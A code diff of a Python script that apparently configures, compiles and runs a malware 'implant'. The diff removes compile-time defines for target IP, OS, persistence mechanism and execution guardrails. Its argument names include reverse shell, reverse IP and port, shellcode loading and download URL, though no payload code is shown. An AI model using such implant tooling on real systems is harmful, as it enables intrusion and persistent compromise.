@@ -137,9 +137,6 @@ if args.enddate != "unknown":
 
 #   log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(args.domain), str(args.architecture), str(args.platform), str(args.os), str(args.versionNumber), str(args.payload), str(args.activate), str(args.interface), str(args.key), str(args.size), str(args.dateDelay), str(args.timeDelay), str(args.trigger), str(args.persistence), str(args.bang), str(args.downloadURL), str(args.loadShellcode), str(args.reverseShell), str(args.reverseIP), str(args.reversePort), str(args.notes), str(args.debug), str(args.outputName), str(args.strip), str(args.static)])
 
-    print(args)
-
-
 cmdString = ["gcc", "test.c", "-o", args.outputName]
  
 
@@ -148,35 +145,4 @@ subprocess.run(valString)
 
 subprocess.run("./implant")
 subprocess.run("./valHelper")
-if args.debug:
-    cmdString.insert(1, "-D DEBUG")
-
-if args.ipAddress != "unknown":
-    cmdString.insert(1, "-D IPNUM=\"" +(args.ipAddress)+ "\"")
-
-if args.architecture != "unknown":
-    cmdString.insert(1, "-D ARCH=\"" +(args.architecture)+ "\"")
-
-if args.os != "unknown":
-    cmdString.insert(1, "-D OS=\"" +(args.os)+ "\"")
-
-if args.libcversion != "unknown":
-    cmdString.insert(1, "-D LIBV=\"" +(args.libcversion)+ "\"")
-
-if args.kernversion != "unknown":
-    cmdString.insert(1, "-D KERV=\"" +(args.kernversion)+ "\"")
-
-if args.functionality != "unknown":
-    cmdString.insert(1, "-D FUNC=\"" +(args.functionality)+ "\"")
-
-if args.execguardrails != "unknown":
-    cmdString.insert(1, "-D EXEC=\"" +(args.execguardrails)+ "\"")
-
-if args.persistmech != "unknown":
-    cmdString.insert(1, "-D PERM=\"" +(args.persistmech)+ "\"")
-
-subprocess.run(cmdString)
-
-subprocess.run("./implant")
-
 
